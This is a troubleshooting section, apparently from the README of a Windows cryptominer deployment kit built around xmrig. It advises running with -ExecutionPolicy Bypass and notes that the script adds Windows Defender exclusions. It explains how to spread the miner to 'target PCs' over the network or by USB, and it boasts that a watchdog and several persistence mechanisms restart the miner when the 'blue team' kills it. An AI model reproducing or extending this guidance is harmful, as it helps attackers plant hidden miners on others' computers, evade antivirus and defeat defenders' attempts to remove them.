                         🔧 TROUBLESHOOTING
═══════════════════════════════════════════════════════════════════════════════

Problem: "Access Denied" when running script
Solution: Right-click → Run as Administrator

Problem: PowerShell execution policy error
Solution: Already handled in scripts (uses -ExecutionPolicy Bypass)

Problem: Windows Defender blocks xmrig.exe
Solution: Script automatically adds exclusions, but you may need to restore
         from quarantine first

Problem: Miner not starting
Solution: Check logs at C:\Users\%USERNAME%\AppData\Local\Temp\ultimate_deploy.log

Problem: Can't deploy via network
Solution: 
   • Ensure File and Printer Sharing is enabled
   • Check firewall settings
   • Verify admin rights on target PCs
   • Use USB method instead

Problem: Blue team kills the miner
Solution: Auto-restart watchdog will restart it in 15 seconds!
         Multiple persistence mechanisms ensure it comes back
